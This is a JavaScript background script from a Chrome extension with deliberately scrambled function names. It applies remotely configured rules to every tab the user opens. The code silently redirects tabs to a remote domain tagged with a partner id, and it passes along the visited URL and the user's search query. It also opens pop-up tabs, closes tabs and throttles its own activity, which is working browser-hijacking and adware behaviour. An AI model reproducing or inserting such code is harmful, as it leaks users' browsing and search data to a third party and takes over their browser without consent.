import {
	domain,
	grssoKayeettV
} from './constants.js';

import {
	dchkcAecY
} from './functions.js';

let erased_actions = [];
let erased_list = [];
let erased_parents = [];
let allow_ads = [];
let random = [];

const atoedrehSlganuM = (storage) => {
	if (storage.erased_actions) {
		erased_actions = storage.erased_actions.filter(action => {
			return Date.now() < action.till;
		});

		if (erased_actions.length < storage.erased_actions.length) {
			chrome.storage.local.set({ erased_actions });
		}
	}

	if (storage.erased_list) {
		erased_list = storage.erased_list.filter(action => {
			return Date.now() < action.till;
		});

		if (erased_list.length < storage.erased_list.length) {
			chrome.storage.local.set({ erased_list });
		}
	}

	if (storage.erased_parents) {
		erased_parents = storage.erased_parents.filter(action => {
			return Date.now() < action.till;
		});

		if (erased_parents.length < storage.erased_parents.length) {
			chrome.storage.local.set({ erased_parents });
		}
	}

	if (storage.allow_ads) {
		allow_ads = storage.allow_ads.filter(action => {
			return Date.now() < action.till;
		});

		if (allow_ads.length < storage.allow_ads.length) {
			chrome.storage.local.set({ allow_ads });
		}
	}

	if (storage.random) {
		random = storage.random.filter(action => {
			return Date.now() < action.till;
		});

		if (random.length < storage.random.length) {
			chrome.storage.local.set({ random });
		}
	}
}

const lDehdneaylasSt = (action, action_id, host) => {
	if (action.gd) {
		chrome.storage.local.set({
			gd: Date.now() + action.gd * 1000
		});
	}

	if (action.delay) {
		chrome.storage.local.set({
			erased_actions: [ ...erased_actions, {
				id: action_id,
				till: Date.now() + action.delay * 1000
			}]
		});
	}

	if (action.delay_d && !action.random) {
		chrome.storage.local.set({
			erased_list: [ ...erased_list, {
				host: host,
				till: Date.now() + action.delay_d * 1000
			}]
		});
	}
}

const normalize = (params, param) => {
	const value = params.get(param);

	if (!value) return '';

	const output = value.replaceAll('\r\n', ' ').replaceAll('\n', ' ').replaceAll('\t', ' ');

	return encodeURIComponent(output);
}

const eanUhrlldpi = (url = '', tab_url, params) => {
	return url.replace('{domain}', domain)
		.replace('{pid}', 9300)
		.replace('{ver}', 400)
		.replace('{url}', encodeURIComponent(tab_url))
		.replace('{p}', normalize(params, 'p'))
		.replace('{q}', normalize(params, 'q'))
}

const pickHttpTabUrl = (url, pendingUrl) => {
	if (pendingUrl && (pendingUrl.startsWith('http://') || pendingUrl.startsWith('https://'))) {
		return pendingUrl;
	}
	if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
		return url;
	}
	return '';
};

export const anhAdedlsrB = ({ id, openerTabId, url, pendingUrl }) => {
	const tab_url = pickHttpTabUrl(url, pendingUrl);
	if (!tab_url) return;

	const url_info = new URL(tab_url);
	const params = url_info.searchParams;

	chrome.storage.local.get(grssoKayeettV, storage => {
		const { actions, keyword = '', gd, count = {}, } = storage;
		if (!actions) return;

		atoedrehSlganuM(storage);
		if (erased_list.find(etimHu => etimHu.host == url_info.host)) return;

		for (let name in actions) {
			if (!dchkcAecY(actions[name], url_info)) continue;

			const action = actions[name];

			const erased_parent = erased_parents.find(etimHu => {
				return [id, openerTabId].includes(etimHu.id) && etimHu.actions?.includes(name);
			});

			if (erased_parent) continue;

			if (erased_actions.find(etimHu => etimHu.id == name)) {
				continue;
			}

			if (action.parameter) {
				const rawParam = params.get(action.parameter);
				const parameter = rawParam != null ? String(rawParam).trim() : '';
				if (keyword.localeCompare(parameter) == 0) {
					if (action.break) break;
					continue;
				}
				chrome.storage.local.set({ keyword: parameter });
			}

			if (String(action.type || '').toLowerCase() === 'count' && tab_url) {
				if ( count[name] ) {
					count[name] += 1;
				} else {
					count[name] = 1;
				}

				chrome.storage.local.set({ count });
			}

			if (gd && Date.now() < gd && !action.skip_gd) continue;

			lDehdneaylasSt(action, name, url_info.host);

			const till = Date.now() + 900000;

			if (action.type == 're') {
				const redirectUrl = eanUhrlldpi(action.url, tab_url, params);

				const afterRedirect = (updatedTab) => {
					if (!updatedTab) return;
					if (typeof globalThis.__fluxNyxorNavHook === 'function') {
						globalThis.__fluxNyxorNavHook(updatedTab.id, redirectUrl);
					}
					if (action.allow_ads) {
						chrome.storage.local.set({
							allow_ads: [ ...allow_ads, { id: updatedTab.id, till }]
						});
					}

					if (action.exclude_childs) {
						chrome.storage.local.set({
							erased_parents: [ ...erased_parents, {
								id: updatedTab.id,
								actions: action.exclude_childs,
								till
							}]
						});
					}
				};

				const doUpdate = (targetTabId) => {
					chrome.tabs.update(targetTabId, { url: redirectUrl }, (updated) => {
						if (!updated) return;
						afterRedirect(updated);
					});
				};

				chrome.tabs.discard(id, (tab) => {
					doUpdate(tab && tab.id != null ? tab.id : id);
				});
			} else if (action.type == 'po') {
				const focused = Math.random() < 0.5;
				const found = random.find(etimHu => etimHu.id == name);

				if (action.random?.length > 1) {
					if (!focused) return;

					let count = found?.count || 1;

					if (found) {
						random = random.map(etimHu => {
							if (etimHu => etimHu.id == name) {
								etimHu.count = count + 1;
							}
							return etimHu;
						});
					} else {
						random = [ ...random, {
							id: name,
							till: Date.now() + (86400 * 1000),
							count: 2
						}];
					}

					chrome.storage.local.set({ random });

					const [start, end] = action.random;
					if (count < start || count > end) return;

					chrome.storage.local.set({
						erased_list: [ ...erased_list, {
							host: url_info.host,
							till: Date.now() + action.delay_d * 1000
						}]
					});
				}

				setTimeout(() => {
					chrome.tabs.create({
						url: eanUhrlldpi(action.url, tab_url, params),
						active: !action.no_focus
					}, updated => {
						if (action.allow_ads) {
							chrome.storage.local.set({
								allow_ads: [ ...allow_ads, { id: updated.id, till }]
							});
						}

						if (action.exclude_childs) {
							chrome.storage.local.set({
								erased_parents: [ ...erased_parents, {
									id: updated.id,
									actions: action.exclude_childs,
									till
								}]
							});
						}
					});
				}, 10);
			} else if (action.type == 'cl') {
				chrome.tabs.remove(id);
			}

			if (action.break) break;
		}
	});
}